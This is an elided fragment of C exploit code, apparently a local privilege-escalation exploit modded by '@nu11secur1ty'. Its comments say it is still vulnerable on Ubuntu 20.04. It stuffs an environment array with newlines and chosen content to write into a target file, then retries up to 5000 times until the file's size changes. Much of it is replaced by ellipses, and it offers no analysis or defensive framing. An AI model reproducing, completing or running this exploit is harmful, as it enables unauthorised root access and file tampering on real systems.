...
int main(int my_argc, char **my_argv)
{
    ...
    puts("Debugging and modded by @nu11secur1ty");
    ...
    char *envp[] = {
        "\n\n\n\n\n", // put some fuckin newlines here to separate our real contents from the junk
        shit_to_write,
    ...
    // Boom =)
    // for (int i = 0; i < 5000; i++) (test_original)
    // Already Patched!!!
    // 02.02.2021 - still vulnerable - Ubuntu 20.04 beta
    for (int i = 0; i < 5000; i++) {
        ...
        if (query_target_size() != initial_size) {
            ...
            system("xdg-open 'https://www.youtube.com/watch?v=LesJAjQf0-g'"); // ayy lmao
            return 0;
        }
    }
